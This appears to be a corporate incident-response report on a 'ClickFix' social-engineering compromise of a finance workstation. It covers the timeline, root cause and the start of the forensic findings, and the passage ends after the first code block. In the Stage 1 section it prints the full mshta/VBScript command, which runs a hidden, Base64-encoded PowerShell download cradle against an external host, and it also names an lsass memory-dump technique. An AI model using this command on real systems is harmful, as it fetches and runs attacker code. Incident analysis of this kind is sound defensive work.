# Post-Incident Report: CSIRT-CASE-042

| Document Metadata | Details |
| :--- | :--- |
| **Incident ID** | `CSIRT-2026-042` |
| **Severity** | **High (Severity 2)** — Credential Access & Active C2 on Single Finance Endpoint |
| **Status** | **Closed / Remediated** |
| **Incident Date / Time** | October 15, 2026, 14:21:11 UTC |
| **Detection Date / Time** | October 15, 2026, 14:22:05 UTC (Time-to-Detect: **54 seconds**) |
| **Containment Time** | October 15, 2026, 14:26:30 UTC (Time-to-Contain: **5 minutes 19 seconds**) |
| **Affected Asset** | `WKSTN-FIN-09` (`10.20.14.109`) — Windows 11 Enterprise 24H2 |
| **Affected User** | `CORP\j.miller` (Financial Analyst) |
| **Compliance Framework** | NIST SP 800-61 Rev. 3 |

---

## 1. Executive Summary
On **October 15, 2026, at 14:21 UTC**, employee `j.miller` on host `WKSTN-FIN-09` interacted with a fraudulent browser verification prompt ("ClickFix" social engineering lure) while browsing a third-party vendor portal. Following the on-screen instructions, the user pressed `Win + R`, pasted a clipboard command, and pressed Enter.

This action invoked `mshta.exe`, which spawned a hidden, Base64-encoded PowerShell download cradle that retrieved a Stage-2 credential stealer (`sync_helper.exe`) from `198.51.100[.]42`. Within 33 seconds, the payload created a persistence Scheduled Task (`EdgeUpdateSync`), dumped `lsass.exe` memory via `comsvcs.dll`, and initiated an outbound TLS session to `203.0.113[.]88:8443`.

EDR behavioral alerting triggered on the `lsass.exe` access event at `14:22:05 UTC`. The CSIRT isolated `WKSTN-FIN-09` at `14:26:30 UTC`, revoked all active session tokens and Kerberos tickets for `CORP\j.miller`, blocked C2 indicators at the perimeter firewall/DNS sinkhole, and confirmed zero lateral movement across the environment.

---

## 2. Root Cause Analysis (RCA)
* **Initial Vector:** Compromised third-party web portal serving a fake verification modal (`T1566.002` / `T1204.004`).
* **Control Gap 1 (User Execution):** The Windows Run dialog (`Win + R`) was accessible to standard non-administrative workstation users, allowing manual execution of `mshta.exe`.
* **Control Gap 2 (LOLBin Exposure):** `mshta.exe` was not blocked via Windows Defender Application Control (WDAC) / AppLocker policies on standard finance workstations.

---

## 3. Technical Attack Analysis & Forensic Findings

### Stage 1: Initial Access & LOLBin Proxy Execution (`14:21:11 UTC` – `14:21:14 UTC`)
Sysmon Event ID 1 recorded `C:\Windows\explorer.exe` spawning `C:\Windows\System32\mshta.exe` with inline VBScript:
```text
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell.exe -NoP -W Hidden -EncodedCommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdocHRwOi8vMTk4LjUxLjEwMC40Mi9pbml0LnBzMScp"", 0 : window.close")
